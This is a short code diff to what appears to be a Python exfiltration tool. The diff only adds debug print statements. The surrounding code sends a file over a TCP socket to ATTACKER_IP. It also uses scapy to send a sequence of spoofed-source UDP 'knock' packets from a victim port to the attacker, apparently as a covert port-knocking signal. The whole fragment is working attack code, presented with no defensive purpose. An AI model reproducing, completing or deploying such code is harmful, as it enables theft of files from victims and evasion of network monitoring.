@@ -5,6 +5,7 @@ from scapy.layers.inet import IP, UDP
 
 
 def send_file(file_path):
+    print('Sending File...')
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ATTACKER_IP, FILE_TRANSFER_PORT))
 
@@ -19,12 +20,15 @@ def send_file(file_path):
     s.close()
 
 def knock():
+    print('Knock1')
     packet = IP(dst=ATTACKER_IP, src=knock_1) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
     send(packet)
     sleep(1.5)
+    print('Knock2')
     packet = IP(dst=ATTACKER_IP, src=knock_2) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
     send(packet)
     sleep(1.5)
+    print('Knock3')
     packet = IP(dst=ATTACKER_IP, src=knock_3) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
     send(packet)
     sleep(1.5)
